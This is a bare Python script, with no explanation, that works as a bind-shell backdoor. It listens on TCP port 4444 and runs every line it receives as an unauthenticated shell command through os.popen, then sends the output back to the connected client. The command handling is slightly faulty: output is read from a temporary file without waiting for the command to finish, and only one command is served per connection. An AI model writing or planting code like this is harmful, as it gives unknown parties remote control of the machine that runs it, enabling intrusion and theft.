import socket
import os 

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

IP = socket.gethostbyname(socket.gethostname())
PORT = 4444  
server.bind((IP, PORT))
ADDRESS = (IP, PORT)

server.listen()
print(f"Listening on {IP}:{PORT}")

while True: 
    connection, address = server.accept()
    try:
        print(f"[NEW CONNECTION] {ADDRESS} connected!")
        
        while True:
            data = connection.recv(2048).decode("utf-8")
            os.popen(data+">cmdresult.txt")
            file1 = open('cmdresult.txt', 'r')
            Lines = file1.readlines()
            for line in Lines:
                connection.sendall(line.encode("utf-8"))
            connection.close()
            break

    finally:
        connection.close()

            

